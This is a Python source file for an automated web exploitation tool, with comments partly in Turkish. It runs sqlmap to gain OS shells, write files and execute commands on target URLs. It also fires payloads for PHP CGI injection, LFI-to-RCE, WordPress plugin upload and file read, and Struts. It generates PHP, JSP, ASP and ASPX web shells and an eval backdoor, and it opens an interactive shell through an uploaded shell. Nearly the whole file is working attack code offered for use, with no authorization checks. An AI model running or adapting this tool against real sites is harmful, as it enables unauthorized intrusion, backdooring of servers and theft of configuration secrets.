import subprocess
import json
import os
import logging
import time
from typing import List, Dict, Optional, Set
from urllib.parse import urlparse, urljoin
import requests
from bs4 import BeautifulSoup
import re
import threading
import queue
import argparse
import sys
from colorama import init, Fore, Style

# Colorama initialization
init(autoreset=True)

# Configuration setup
base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
setting_path = os.path.join(base_dir, 'config', 'setting.json')

with open(setting_path, 'r', encoding='utf-8') as f:
    setting = json.load(f)

# Directory and file paths
SCAN_RESULTS_DIR = "scan_results"
SHELL_RESULTS_FILE = os.path.join(SCAN_RESULTS_DIR, "shell_scanner.txt")
LOG_DIR = os.path.join("log", "shell_scanner")
LOG_FILE = os.path.join(LOG_DIR, "shell_scanner_log.txt")
OUTPUT_DIR = "exploits"

# Configure logging
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class AdvancedShellScanner:
    def __init__(self):
        self.sqlmap_base_args = [
            "sqlmap", "-v3", "--batch", 
            f"--threads={setting.get('sqlmap_threads', 10)}",
            "--output-dir", OUTPUT_DIR, 
            f"--level={setting.get('sqlmap_level', 3)}", 
            f"--risk={setting.get('sqlmap_risk', 3)}",
            "--tamper=space2comment,randomcase"
        ]
        self.exploit_methods = [
            self.try_os_shell,
            self.try_file_upload,
            self.try_command_execution,
            self.try_web_exploits
        ]
        self.exploit_db = self.load_exploits()
        self.successful_exploits = []
        self.found_endpoints = set()
        self.technologies = []

    class DiscoveryEngine:
        def __init__(self, target):
            self.target = target
            self.found_endpoints = set()
            self.technologies = []
            
        def crawl(self, depth=3):
            """Derinlemesine sayfa keşfi yapar"""
            visited = set()
            to_visit = queue.Queue()
            to_visit.put(self.target)
            
            for _ in range(depth):
                current_url = to_visit.get()
                if current_url in visited:
                    continue
                    
                try:
                    response = requests.get(current_url, timeout=10)
                    visited.add(current_url)
                    
                    # Teknoloji tespiti
                    self.detect_tech(response)
                    
                    # Link çıkarma
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        full_url = urljoin(current_url, link['href'])
                        if urlparse(full_url).netloc == urlparse(self.target).netloc:
                            to_visit.put(full_url)
                            self.found_endpoints.add(full_url)
                            
                except Exception as e:
                    continue
                    
        def detect_tech(self, response):
            """Web teknolojilerini tespit eder"""
            tech_signatures = {
                'PHP': ['X-Powered-By: PHP', '\.php'],
                'WordPress': ['wp-content', 'wp-includes'],
                'Apache': ['Server: Apache'],
                'Nginx': ['Server: nginx'],
                'Joomla': ['joomla'],
                'Drupal': ['drupal'],
                'ASP.NET': ['ASP.NET', 'X-AspNet-Version'],
                'Node.js': ['X-Powered-By: Express'],
                'Laravel': ['laravel_session']
            }
            
            headers = str(response.headers).lower()
            body = response.text.lower()
            
            for tech, signatures in tech_signatures.items():
                for sig in signatures:
                    if re.search(sig.lower(), headers) or re.search(sig.lower(), body):
                        if tech not in self.technologies:
                            self.technologies.append(tech)

    def load_exploits(self):
        """JSON tabanlı exploit veritabanı yükler"""
        exploits = {
            'PHP': [
                {
                    'name': 'PHP CGI Argument Injection',
                    'payload': '/cgi-bin/php?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input',
                    'method': 'POST',
                    'vulnerable_versions': ['<5.3.12', '<5.4.2']
                },
                {
                    'name': 'PHP LFI to RCE',
                    'payload': '/index.php?page=php://input',
                    'method': 'POST',
                    'data': '<?php system($_GET["cmd"]); ?>'
                }
            ],
            'WordPress': [
                {
                    'name': 'WP File Manager RCE',
                    'payload': '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
                    'method': 'POST',
                    'parameters': {'cmd': 'upload', 'target': 'l1_', 'upload[]': '@shell.php'}
                },
                {
                    'name': 'WP Duplicator Arbitrary File Read',
                    'payload': '/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../wp-config.php',
                    'method': 'GET'
                }
            ],
            'Apache': [
                {
                    'name': 'Apache Struts RCE',
                    'payload': '/struts2-showcase/$%7B233*233%7D/actionChain1.action',
                    'method': 'GET'
                }
            ]
        }
        return exploits
        
    def get_exploits_for_tech(self, technology):
        """Belirli bir teknoloji için exploitleri döndürür"""
        return self.exploit_db.get(technology, [])

    def generate_shell(self, type='php'):
        """Çeşitli shell türleri oluşturur"""
        shells = {
            'php': '<?php system($_GET["cmd"]); ?>',
            'php_backdoor': '<?php eval($_POST["pass"]); ?>',
            'jsp': '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } p.destroy(); } %>',
            'asp': '<% Set objShell = CreateObject("WScript.Shell") Set objExec = objShell.Exec("cmd /c " & Request("cmd")) Response.Write(objExec.StdOut.ReadAll()) %>',
            'aspx': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>'
        }
        return shells.get(type, '')
        
    def upload_shell(self, target_url, shell_content, params=None):
        """Shell yüklemeye çalışır"""
        try:
            if params:
                files = {}
                for param, value in params.items():
                    if value.startswith('@'):
                        files[param] = (value[1:], shell_content)
                response = requests.post(target_url, files=files)
            else:
                response = requests.post(target_url, data={'file': shell_content})
                
            return response.status_code == 200
        except Exception:
            return False

    def run_sqlmap_scan(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Run initial sqlmap scan to confirm vulnerability."""
        try:
            args = self.sqlmap_base_args + ["-u", url]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
            
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "is vulnerable" in result.stdout.lower() or "confirmed" in result.stdout.lower():
                logging.info(f"SQLmap confirmed vulnerability for {url}")
                print(f"{Fore.GREEN}[+] SQLmap confirmed vulnerability for {url}{Style.RESET_ALL}")
                return True
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"SQLmap scan timed out for {url}")
            print(f"{Fore.RED}[-] SQLmap scan timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"SQLmap scan error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] SQLmap scan error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_os_shell(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Attempt to gain OS shell access."""
        try:
            args = self.sqlmap_base_args + ["-u", url, "--os-shell"]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
                
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "web application OS shell" in result.stdout.lower():
                logging.info(f"OS shell successful for {url}")
                print(f"{Fore.GREEN}[+] OS shell gained for {url}{Style.RESET_ALL}")
                return True
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"OS shell attempt timed out for {url}")
            print(f"{Fore.RED}[-] OS shell attempt timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"OS shell error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] OS shell error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_file_upload(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Attempt to upload a malicious file."""
        try:
            shell_content = self.generate_shell('php')
            shell_path = os.path.join(OUTPUT_DIR, "shell.php")
            with open(shell_path, "w") as f:
                f.write(shell_content)
                
            args = self.sqlmap_base_args + [
                "-u", url,
                "--file-write", shell_path,
                "--file-dest", setting.get('shell_upload_path', "/var/www/html/shell.php")
            ]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
                
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "file uploaded successfully" in result.stdout.lower():
                parsed = urlparse(url)
                shell_url = f"{parsed.scheme}://{parsed.netloc}/shell.php"
                try:
                    response = requests.get(shell_url, timeout=setting.get('request_timeout', 10))
                    if response.status_code == 200:
                        logging.info(f"File upload successful for {url} - Shell at {shell_url}")
                        print(f"{Fore.GREEN}[+] Shell uploaded to {shell_url}{Style.RESET_ALL}")
                        return True
                except requests.RequestException:
                    logging.warning(f"Shell uploaded but not accessible at {shell_url}")
                    print(f"{Fore.YELLOW}[!] Shell uploaded but not accessible at {shell_url}{Style.RESET_ALL}")
                    return False
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"File upload attempt timed out for {url}")
            print(f"{Fore.RED}[-] File upload attempt timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"File upload error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] File upload error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_command_execution(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Attempt direct command execution."""
        try:
            args = self.sqlmap_base_args + ["-u", url, "--os-cmd", setting.get('test_command', "whoami")]
            if vuln_info and 'parameter' in vuln_info:
                args.extend(["-p", vuln_info['parameter']])
                
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=setting.get('sqlmap_timeout', 300)
            )
            if "command output" in result.stdout.lower():
                logging.info(f"Command execution successful for {url}")
                print(f"{Fore.GREEN}[+] Command execution successful for {url}{Style.RESET_ALL}")
                return True
            return False
        except subprocess.TimeoutExpired:
            logging.error(f"Command execution timed out for {url}")
            print(f"{Fore.RED}[-] Command execution timed out for {url}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"Command execution error for {url}: {str(e)}")
            print(f"{Fore.RED}[-] Command execution error for {url}: {str(e)}{Style.RESET_ALL}")
            return False

    def try_web_exploits(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
        """Try web application specific exploits based on detected technologies."""
        discovery = self.DiscoveryEngine(url)
        discovery.crawl()
        
        for tech in discovery.technologies:
            exploits = self.get_exploits_for_tech(tech)
            for exploit in exploits:
                print(f"{Fore.CYAN}[*] Trying {exploit['name']} on {url}{Style.RESET_ALL}")
                
                target_url = urljoin(url, exploit.get('payload', ''))
                if exploit.get('method', 'GET') == 'POST':
                    if 'parameters' in exploit:
                        shell_content = self.generate_shell('php')
                        if self.upload_shell(target_url, shell_content, exploit['parameters']):
                            result = {
                                'url': target_url,
                                'method': exploit['name'],
                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                'type': 'web_exploit'
                            }
                            self.successful_exploits.append(result)
                            return True
                    else:
                        response = requests.post(target_url, data=exploit.get('data', {}))
                        if self.check_exploit_success(response):
                            result = {
                                'url': target_url,
                                'method': exploit['name'],
                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                'type': 'web_exploit'
                            }
                            self.successful_exploits.append(result)
                            return True
                else:
                    response = requests.get(target_url)
                    if self.check_exploit_success(response):
                        result = {
                            'url': target_url,
                            'method': exploit['name'],
                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                            'type': 'web_exploit'
                        }
                        self.successful_exploits.append(result)
                        return True
        return False

    def check_exploit_success(self, response):
        """Exploitin başarılı olup olmadığını kontrol eder"""
        # Basit bir başarı kontrolü - geliştirilebilir
        return response.status_code == 200 and len(response.text) > 0

    def load_vulnerable_urls(self) -> List[Dict]:
        """Load URLs from setting.json based on TARGET_FILE_CHECK."""
        vulnerable_urls = []
        
        if setting.get('TARGET_FILE_CHECK', 'off').lower() == "on":
            target_file_path = setting.get("TARGET_FILE_PATH")
            if not os.path.exists(target_file_path):
                logging.error(f"Target file not found: {target_file_path}")
                print(f"{Fore.RED}[-] Target file not found: {target_file_path}{Style.RESET_ALL}")
                return []
            try:
                with open(target_file_path, "r") as f:
                    for line in f:
                        url = line.strip()
                        if url:
                            vuln_info = {'url': url, 'db_type': 'Unknown', 'parameter': None}
                            vulnerable_urls.append(vuln_info)
                logging.info(f"Loaded {len(vulnerable_urls)} URLs from {target_file_path}")
                print(f"{Fore.CYAN}[*] Loaded {len(vulnerable_urls)} URLs from {target_file_path}{Style.RESET_ALL}")
            except Exception as e:
                logging.error(f"Error loading {target_file_path}: {str(e)}")
                print(f"{Fore.RED}[-] Error loading {target_file_path}: {str(e)}{Style.RESET_ALL}")
        else:
            target = setting.get('TARGET')
            if not target:
                logging.error("No target specified in setting.json")
                print(f"{Fore.RED}[-] No target specified in setting.json{Style.RESET_ALL}")
                return []
            vulnerable_urls.append({'url': target, 'db_type': 'Unknown', 'parameter': None})
            logging.info(f"Loaded single URL from setting.json: {target}")
            print(f"{Fore.CYAN}[*] Loaded target URL: {target}{Style.RESET_ALL}")
        
        return vulnerable_urls

    def save_results(self, successful_exploits: List[Dict], failed_urls: List[str]) -> None:
        """Save successful exploit results to shell_scanner.txt."""
        if not os.path.exists(SCAN_RESULTS_DIR):
            os.makedirs(SCAN_RESULTS_DIR)
        
        with open(SHELL_RESULTS_FILE, "a") as f:
            for exploit in successful_exploits:
                f.write(json.dumps(exploit) + "\n")
        
        # Log both successful and failed attempts
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n\n=== Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
            log_file.write("\nSUCCESSFUL EXPLOITS:\n")
            for exploit in successful_exploits:
                log_file.write(f"URL: {exploit['url']}\n")
                log_file.write(f"Method: {exploit['method']}\n")
                log_file.write(f"Type: {exploit.get('type', 'unknown')}\n")
                log_file.write(f"Timestamp: {exploit['timestamp']}\n")
                log_file.write("----------------------------------------\n")
            
            log_file.write("\nFAILED EXPLOITS:\n")
            for url in failed_urls:
                log_file.write(f"{url}\n")

    def exploit_url(self, vuln_info: Dict) -> Optional[Dict]:
        """Attempt to exploit a single URL and return result if successful."""
        url = vuln_info['url']
        print(f"{Fore.CYAN}[*] Processing {url}{Style.RESET_ALL}")
        logging.info(f"Starting processing for {url}")

        # Run initial sqlmap scan
        sqlmap_success = self.run_sqlmap_scan(url, vuln_info)
        
        # Try exploitation methods
        exploit_results = []
        
        # SQLi based exploits
        if sqlmap_success:
            for method in [self.try_os_shell, self.try_file_upload, self.try_command_execution]:
                if method(url, vuln_info):
                    result = {
                        'url': url,
                        'method': method.__name__,
                        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                        'type': 'sqli_exploit'
                    }
                    exploit_results.append(result)
        
        # Web application specific exploits
        if self.try_web_exploits(url, vuln_info):
            exploit_results.extend([e for e in self.successful_exploits if e['url'] == url])
        
        if exploit_results:
            print(f"{Fore.GREEN}[+] Exploitation successful for {url}{Style.RESET_ALL}")
            return exploit_results
            
        print(f"{Fore.YELLOW}[-] No successful exploitation for {url}{Style.RESET_ALL}")
        logging.info(f"No successful exploitation for {url}")
        return None

    def interactive_shell(self, shell_url: str):
        """Interaktif shell oturumu başlatır"""
        print(f"{Fore.GREEN}[+] Interaktif shell oturumu başladı. 'exit' yazarak çıkın.{Style.RESET_ALL}")
        while True:
            cmd = input(f"{Fore.RED}shell> {Style.RESET_ALL}")
            if cmd.lower() == 'exit':
                break
            try:
                if '?' in shell_url:
                    full_url = f"{shell_url}&cmd={cmd}"
                else:
                    full_url = f"{shell_url}?cmd={cmd}"
                response = requests.get(full_url, timeout=10)
                print(response.text)
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")

def run_shell_scanner() -> None:
    start_time = time.time()
    
    # Create output directory
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    scanner = AdvancedShellScanner()
    vulnerable_urls = scanner.load_vulnerable_urls()
    
    if not vulnerable_urls:
        print(f"{Fore.RED}[-] No URLs found to exploit{Style.RESET_ALL}")
        logging.error("No URLs found to exploit")
        return

    print(f"{Fore.CYAN}[*] Found {len(vulnerable_urls)} URLs to process{Style.RESET_ALL}")
    
    successful_exploits = []
    failed_urls = []
    
    for vuln_info in vulnerable_urls:
        results = scanner.exploit_url(vuln_info)
        if results:
            successful_exploits.extend(results)
        else:
            failed_urls.append(vuln_info['url'])

    # Save results
    scanner.save_results(successful_exploits, failed_urls)

    # Print summary
    elapsed_time = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Exploitation Summary:")
    print(f"Total URLs processed: {len(vulnerable_urls)}")
    print(f"Successful exploits: {len(successful_exploits)}")
    print(f"Failed exploits: {len(failed_urls)}")
    print(f"Execution time: {elapsed_time:.2f} seconds{Style.RESET_ALL}")
    
    logging.info(
        f"Exploitation completed. "
        f"Processed: {len(vulnerable_urls)}, "
        f"Successful: {len(successful_exploits)}, "
        f"Failed: {len(failed_urls)}, "
        f"Time: {elapsed_time:.2f} seconds"
    )

    # If we have successful shell uploads, offer interactive session
    shell_urls = [e['url'] for e in successful_exploits if e.get('type') == 'web_exploit' and 'shell.php' in e['url']]
    if shell_urls:
        print(f"\n{Fore.GREEN}[+] Found {len(shell_urls)} active shells{Style.RESET_ALL}")
        for i, url in enumerate(shell_urls, 1):
            print(f"{i}. {url}")
        
        try:
            choice = int(input("\nEnter shell number to connect (0 to exit): "))
            if 1 <= choice <= len(shell_urls):
                scanner.interactive_shell(shell_urls[choice-1])
        except ValueError:
            pass

if __name__ == "__main__":
    run_shell_scanner()